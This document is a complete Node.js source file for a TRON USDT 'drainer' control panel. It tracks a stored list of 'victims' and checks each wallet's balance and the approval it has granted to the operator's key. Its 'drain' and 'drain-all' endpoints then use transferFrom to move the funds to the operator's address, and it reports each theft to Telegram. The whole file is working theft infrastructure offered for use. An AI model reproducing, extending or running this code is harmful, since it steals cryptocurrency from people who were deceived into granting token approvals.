require('dotenv').config();
const express = require('express');
const fs = require('fs');
const path = require('path');
const TronWeb = require('tronweb');

/* ---------- config ---------- */
const PK        = (process.env.SPENDER_PK || '').trim();
const DEST      = (process.env.DEST || '').trim();
const FULL_HOST = process.env.FULL_HOST || 'https://api.trongrid.io';
const TOKEN     = process.env.DASH_TOKEN || 'changeme';
const PORT      = Number(process.env.PORT || 3000);
const MIN_TRX   = Number(process.env.MIN_TRX || 20);
const TG_SECRET = process.env.TG_SECRET || 'hook';
const TG_BOT    = (process.env.TG_BOT_TOKEN || '').trim();
const TG_CHAT   = (process.env.TG_CHAT || '').trim();

const USDT    = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const DECIMALS = 6n;
const FEE_LIMIT = 100_000_000;
const DELAY_MS  = 4000;

if (!PK) throw new Error('SPENDER_PK missing in .env');

const tw = new TronWeb({ fullHost: FULL_HOST, privateKey: PK });
const SPENDER = tw.address.fromPrivateKey(PK);

if (DEST && !tw.isAddress(DEST)) throw new Error('DEST invalid');
if (!tw.isAddress(SPENDER)) throw new Error('SPENDER_PK invalid');

/* ---------- storage ---------- */
const DATA_DIR = path.join(__dirname, 'data');
const DB_FILE  = path.join(DATA_DIR, 'victims.json');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });

function load() {
  try { return JSON.parse(fs.readFileSync(DB_FILE, 'utf8')); } catch { return []; }
}
let victims = load();
function save() { fs.writeFileSync(DB_FILE, JSON.stringify(victims, null, 2)); }

/* ---------- helpers ---------- */
const fmt = u => (Number(u) / 1e6).toFixed(6).replace(/\.?0+$/, '');
const short = a => a.slice(0, 6) + '…' + a.slice(-6);

async function constantCall(selector, params) {
  const r = await tw.transactionBuilder.triggerConstantContract(
    USDT, selector, {}, params, SPENDER
  );
  const hex = (r && r.constant_result && r.constant_result[0]) || '';
  return hex ? BigInt('0x' + hex) : 0n;
}

const getBalance   = a => constantCall('balanceOf(address)', [{ type: 'address', value: a }]);
const getAllowance = a => constantCall('allowance(address,address)',
  [{ type: 'address', value: a }, { type: 'address', value: SPENDER }]);

async function trxBalance() {
  try { return await tw.trx.getBalance(SPENDER); } catch { return 0; }
}

async function refresh(v) {
  try {
    const [bal, allow] = await Promise.all([getBalance(v.addr), getAllowance(v.addr)]);
    v.balance = bal.toString();
    v.allowance = allow.toString();
    v.checked = Date.now();
    v.error = null;
  } catch (e) {
    v.error = (e && e.message) || String(e);
  }
  return v;
}

async function transferFrom(owner, units) {
  const built = await tw.transactionBuilder.triggerSmartContract(
    USDT,
    'transferFrom(address,address,uint256)',
    { feeLimit: FEE_LIMIT, callValue: 0 },
    [
      { type: 'address', value: owner },
      { type: 'address', value: DEST },
      { type: 'uint256', value: units.toString() }
    ],
    SPENDER
  );
  const tx = built.transaction || built;
  if (!tx) throw new Error('tx build failed');
  const signed = await tw.trx.sign(tx);
  const res = await tw.trx.sendRawTransaction(signed);
  return res.txid || signed.txID;
}

function tg(text) {
  if (!TG_BOT || !TG_CHAT) return;
  const u = `https://api.telegram.org/bot${TG_BOT}/sendMessage?chat_id=${encodeURIComponent(TG_CHAT)}&parse_mode=HTML&disable_web_page_preview=1&text=${encodeURIComponent(text)}`;
  fetch(u).catch(() => {});
}

/* ---------- app ---------- */
const app = express();
app.use(express.json({ limit: '64kb' }));
app.use(express.static(path.join(__dirname, 'public')));

function auth(req, res, next) {
  const t = req.get('x-token') || req.query.t;
  if (t !== TOKEN) return res.status(401).json({ error: 'unauthorized' });
  next();
}

/* full state */
app.get('/api/state', auth, async (req, res) => {
  const trx = await trxBalance();
  const rows = victims.map(v => ({
    addr: v.addr,
    note: v.note || '',
    added: v.added,
    balance: v.balance || '0',
    allowance: v.allowance || '0',
    checked: v.checked || 0,
    error: v.error || null
  }));
  rows.sort((a, b) => Number(b.balance) - Number(a.balance));

  const totalBal = rows.reduce((s, r) => s + Number(r.balance), 0);
  res.json({
    spender: SPENDER,
    dest: DEST,
    trx,
    minTrx: MIN_TRX,
    totalBal: totalBal.toFixed(0),
    count: rows.length,
    rows
  });
});

/* add */
app.post('/api/victims', auth, (req, res) => {
  const addr = String(req.body.addr || '').trim();
  if (!tw.isAddress(addr)) return res.status(400).json({ error: 'invalid address' });
  if (victims.some(v => v.addr === addr)) return res.json({ ok: true, dup: true });
  const v = { addr, note: String(req.body.note || '').slice(0, 80), added: Date.now() };
  victims.push(v);
  save();
  refresh(v).then(save);
  res.json({ ok: true });
});

/* delete */
app.delete('/api/victims/:addr', auth, (req, res) => {
  victims = victims.filter(v => v.addr !== req.params.addr);
  save();
  res.json({ ok: true });
});

/* check all */
app.post('/api/check', auth, async (req, res) => {
  for (const v of victims) { await refresh(v); await new Promise(r => setTimeout(r, 250)); }
  save();
  res.json({ ok: true });
});

/* drain one */
app.post('/api/drain/:addr', auth, async (req, res) => {
  const v = victims.find(x => x.addr === req.params.addr);
  if (!v) return res.status(404).json({ error: 'not tracked' });

  await refresh(v);

  const bal = BigInt(v.balance || '0');
  const allow = BigInt(v.allowance || '0');
  if (bal === 0n) return res.status(400).json({ error: 'balance 0' });
  if (allow === 0n) return res.status(400).json({ error: 'no allowance' });

  let units = bal < allow ? bal : allow;

  if (req.body.amount) {
    const n = String(req.body.amount).trim();
    if (!/^\d+(\.\d{0,6})?$/.test(n)) return res.status(400).json({ error: 'bad amount' });
    const want = BigInt(Math.round(Number(n) * 1e6));
    units = want < units ? want : units;
  }
  if (units === 0n) return res.status(400).json({ error: 'nothing to move' });

  if ((await trxBalance()) < MIN_TRX) {
    return res.status(400).json({ error: `low TRX on spender (< ${MIN_TRX})` });
  }

  try {
    const txid = await transferFrom(v.addr, units);
    v.drained = (BigInt(v.drained || '0') + units).toString();
    save();
    tg(`💸 <b>DRAINED</b>\n${short(v.addr)}\n${fmt(units)} USDT\nhttps://tronscan.org/#/transaction/${txid}`);
    res.json({ ok: true, txid, amount: fmt(units) });
  } catch (e) {
    tg(`❌ drain fail ${short(v.addr)}\n${(e && e.message) || e}`);
    res.status(500).json({ error: (e && e.message) || String(e) });
  }
});

/* drain all */
app.post('/api/drain-all', auth, async (req, res) => {
  const out = [];
  for (const v of victims) {
    await refresh(v);
    const bal = BigInt(v.balance || '0');
    const allow = BigInt(v.allowance || '0');
    const units = bal < allow ? bal : allow;
    if (units === 0n) { out.push({ addr: v.addr, skipped: true }); continue; }
    if ((await trxBalance()) < MIN_TRX) { out.push({ addr: v.addr, error: 'low TRX' }); break; }
    try {
      const txid = await transferFrom(v.addr, units);
      out.push({ addr: v.addr, txid, amount: fmt(units) });
    } catch (e) {
      out.push({ addr: v.addr, error: (e && e.message) || String(e) });
    }
    await new Promise(r => setTimeout(r, DELAY_MS));
  }
  save();
  res.json({ ok: true, out });
});

/* ---------- telegram webhook ---------- */
app.post(`/tg/${TG_SECRET}`, async (req, res) => {
  res.json({ ok: true });
  const msg = req.body && req.body.message;
  const text = (msg && msg.text) || '';
  if (!text) return;

  const found = [...new Set(text.match(/\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g) || [])]
    .filter(a => tw.isAddress(a));

  for (const a of found) {
    if (victims.some(v => v.addr === a)) continue;
    const v = { addr: a, added: Date.now(), note: 'tg' };
    victims.push(v);
    await refresh(v);
    save();
  }
  if (found.length) tg(`✅ added ${found.length} wallet(s)`);
});

app.get(`/tg/setup`, auth, async (req, res) => {
  const url = `${req.protocol}://${req.get('host')}/tg/${TG_SECRET}`;
  const r = await fetch(`https://api.telegram.org/bot${TG_BOT}/setWebhook?url=${encodeURIComponent(url)}`);
  res.json(await r.json());
});

app.get('/api/health', (req, res) => res.json({ ok: true, spender: SPENDER }));

app.listen(PORT, () => console.log(`[+] ${PORT} | spender ${SPENDER} | dest ${DEST}`));